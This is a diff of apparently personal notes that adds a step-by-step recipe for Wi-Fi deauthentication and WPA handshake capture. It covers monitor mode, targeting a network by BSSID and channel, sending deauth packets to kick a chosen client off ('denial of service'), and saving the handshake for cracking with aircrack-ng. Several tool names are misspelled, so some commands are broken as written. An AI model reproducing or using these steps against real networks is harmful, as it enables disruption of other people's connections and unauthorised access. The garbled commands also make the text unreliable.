@@ -39,9 +39,28 @@ sudo dkms install 8188eu/1.0
 
 links : https://www.youtube.com/watch?v=X5rpwcb6EuQ
 
+/////////////perform deauth and handshake capture
 
+adaptor switching
+start - airmon-ng start "adaptername or ex:wlan0"
+stop - airmon stop "adaptername or ex:wlan0"
 
-/////////////how to modify .cap or capture handshake
+dump all bssid 
+
+airdump "adaptername in monitor mode or ex:wlan0mon" or target spwcific ssid
+airdump "adaptername in monitor mode or ex:wlan0mon" --bssid "mac address" --channel "channel# example: 18"
+//performing deauth first, look for most active device on the chosen wifi network
+>>denial of service
+open new terminal
+        airplay-ng -0 10 -a "router macaddress" -c "target device mac address" "adapter name in monitor mode ex: wlan0mon"
+  10 will be the amount of packets or the delay time that the user will be kicked out from the network
+  -a is used to specify the access point mac address
+  -c is used to specify target mac address
+   
+ >>capture handshake
+airdump "adaptername in monitor mode or ex:wlan0mon" --bssid "mac address" --channel "channel# example: 18" -w "filenamelocation/filename"
+
+/////////////modify .cap or capture handshake
 
 required tools
 * aircrack.ng
